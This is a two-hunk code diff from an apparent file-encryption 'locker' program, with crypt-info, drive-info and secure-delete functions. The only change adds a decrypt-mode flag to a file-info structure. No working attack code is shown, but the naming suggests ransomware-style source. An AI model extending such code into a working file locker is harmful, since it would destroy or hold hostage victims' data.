@@ -428,7 +428,6 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 	return true;
 }
 
-
 #ifdef _WIN32
 static bool SecureDelete(CONST TCHAR* FilePath)
 {
@@ -469,6 +468,7 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 	FileInfo->CryptInfo = CryptInfo;
 	FileInfo->FilePath = data->FullPath;
 	FileInfo->padding = 0;
+	FileInfo->dcrypt = (int)GLOBAL_ENUM.g_DeCrypt;
 	FileInfo->FileHandle = INVALID_HANDLE_VALUE;
 	FileInfo->newFileHandle = INVALID_HANDLE_VALUE;
 
